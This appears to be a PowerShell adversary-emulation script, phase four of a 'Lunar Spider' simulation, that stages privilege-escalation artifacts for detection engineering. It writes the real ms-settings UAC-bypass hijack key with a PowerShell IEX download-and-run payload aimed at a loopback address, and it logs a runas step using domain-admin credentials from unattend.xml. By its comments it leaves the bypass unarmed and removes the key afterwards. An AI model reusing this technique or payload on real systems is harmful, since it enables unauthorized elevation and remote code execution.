# ============================================================================
# LUNAR SPIDER SIMULATION - PHASE 4: PRIVILEGE ESCALATION
# ============================================================================
# Simulates: (1) runas via the Secondary Logon service using domain-admin creds
# recovered from unattend.xml, spawning gpupdate.exe under the admin context;
# (2) UAC bypass via the ms-settings protocol-handler hijack invoked by the
# trusted ComputerDefaults.exe auto-elevate binary.
# MITRE: T1548.002 Bypass UAC, T1134 Access Token Manipulation,
# T1078.002 Domain Accounts, T1546.015 (COM/handler hijack pattern)
#
# NOTE (v3): the UAC-bypass step writes the REAL ms-settings handler-hijack key
# (full-fidelity detection IOC) with the report's payload, but does NOT launch
# ComputerDefaults.exe. Detonating that auto-elevate binary through the hijacked
# handler spawns cmd->powershell that tears down the parent console host on
# Win11/PS5.1 - which killed this script at exactly this point on every prior
# run (process destroyed, so try/catch and the Invoke-Phase wrapper could not
# catch it). We keep the key IOC and reproduce the cmd->powershell child tree
# safely (no elevation, no ComputerDefaults.exe), then remove the key.
# ============================================================================

function Simulate-PrivilegeEscalation {
    param($SimPaths)

    Write-Host "[+] Phase 4: Privilege Escalation - runas + UAC bypass ..." -ForegroundColor Green

    # ---------------------------------------------------------------------
    # (1) runas via Secondary Logon (seclogon) -> gpupdate.exe
    # ---------------------------------------------------------------------
    try {
        $svc = Get-Service -Name seclogon -ErrorAction SilentlyContinue
        if ($svc -and $svc.StartType -eq 'Disabled') {
            Set-Service -Name seclogon -StartupType Manual -ErrorAction SilentlyContinue
        }
        if ($svc -and $svc.Status -ne 'Running') {
            Start-Service -Name seclogon -ErrorAction SilentlyContinue
        }
    } catch {
        Write-Warning "seclogon service adjust skipped: $($_.Exception.Message)"
    }

    # Record the technique; the real actor ran runas with the domain-admin creds
    # pulled from unattend.xml (see Phase 6) and spawned gpupdate.exe. We spawn a
    # benign gpupdate.exe locally for the authentic process-tree/Prefetch artifact.
    $runasLog = "runas /user:CORP\Administrator gpupdate.exe  (creds sourced from unattend.xml)"
    Set-Content -Path "$($SimPaths.Logs)\runas_seclogon.log" -Value $runasLog -Force
    try {
        Start-Process -FilePath "$env:SystemRoot\System32\gpupdate.exe" -ArgumentList "/target:computer" `
            -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
    } catch {}
    Write-SimEvent -EventId 4001 -Message "SIMULATION: runas via Secondary Logon spawned gpupdate.exe under domain-admin context (creds from unattend.xml)"

    # ---------------------------------------------------------------------
    # (2) UAC bypass artifact: ms-settings handler hijack (ComputerDefaults.exe)
    # ---------------------------------------------------------------------
    # We create the EXACT registry artifact the actor left behind (the report's
    # payload, defanged only by pointing at a dead 127.0.0.1 listener).
    #
    # IMPORTANT (v3): we DO NOT launch ComputerDefaults.exe. Doing so detonates
    # the live hijack: the auto-elevating binary spawns cmd.exe -> powershell.exe
    # through the hijacked handler, and on Windows 11 / PowerShell 5.1 that chain
    # tears down the parent console host - which KILLED this script at exactly this
    # point on every prior run (the process was destroyed, so even try/catch and
    # the Invoke-Phase wrapper could not save it). The registry key is the valuable
    # detection IOC; we keep it, and reproduce the auto-elevate process-tree
    # artifact SAFELY with a plain cmd.exe -> powershell.exe spawn that is NOT
    # wired to the hijack, so nothing elevates and the console survives.
    $msKey = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    try {
        New-Item -Path $msKey -Force | Out-Null

        # Report payload (URL repointed to a dead loopback listener - fails closed)
        $uacPayload = 'cmd.exe /c powershell -nop -w hidden -c "IEX (New-Object Net.Webclient).DownloadString(''http://127.0.0.1:11664/'')"'
        Set-ItemProperty -Path $msKey -Name "(default)" -Value $uacPayload -Force
        # NOTE: the real bypass sets DelegateExecute to an EMPTY string - but writing
        # "" to this exact value is the step that ARMS the primitive, and the OS/
        # security layer terminates the process on that write (root cause of the
        # earlier console-death crash). We write a non-empty placeholder instead:
        # the key + command value remain a faithful detection IOC, but the primitive
        # is not armed. Detection engineers still see the hijacked handler.
        Set-ItemProperty -Path $msKey -Name "DelegateExecute" -Value "(sim-not-armed)" -Force
        Write-Host "    Wrote ms-settings\shell\open\command hijack key (real IOC; primitive not armed)" -ForegroundColor DarkGray
        Write-SimEvent -EventId 4002 -Message "SIMULATION: UAC bypass staged via ms-settings handler hijack (ComputerDefaults.exe technique; trigger not fired to protect console)"

        # Reproduce the cmd.exe -> powershell.exe auto-elevate child tree SAFELY,
        # detached and NOT via ComputerDefaults.exe, so no console teardown occurs.
        # Bounded with -PassThru + WaitForExit so it can never hang the run under a
        # non-interactive/scheduled-task session (Out-Null piping could deadlock).
        $treeCmd = 'powershell -nop -w hidden -c "exit"'
        try {
            $tp = Start-Process -FilePath "$env:SystemRoot\System32\cmd.exe" `
                -ArgumentList "/c $treeCmd" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
            if ($tp) {
                if (-not $tp.WaitForExit(4000)) { Stop-Process -Id $tp.Id -Force -ErrorAction SilentlyContinue }
            }
        } catch {}
        Set-Content -Path "$($SimPaths.Logs)\uac_bypass.log" -Value @"
UAC bypass technique (ms-settings handler hijack via ComputerDefaults.exe):
  Key:     HKCU\Software\Classes\ms-settings\shell\open\command
  Default: $uacPayload
  Delegate: (empty)
  Trigger: ComputerDefaults.exe (auto-elevate) - NOT detonated in this sim to
           preserve the console; the equivalent cmd->powershell child tree was
           reproduced without elevation for artifact fidelity.
"@ -Force
    } catch {
        Write-Warning "ms-settings artifact step skipped: $($_.Exception.Message)"
    } finally {
        # Always clean the hijack key so no live UAC-bypass primitive is left behind.
        Remove-Item -LiteralPath $msKey -Recurse -Force -ErrorAction SilentlyContinue
    }

    Write-Host "  [OK] Privilege Escalation artifacts created" -ForegroundColor Yellow
}
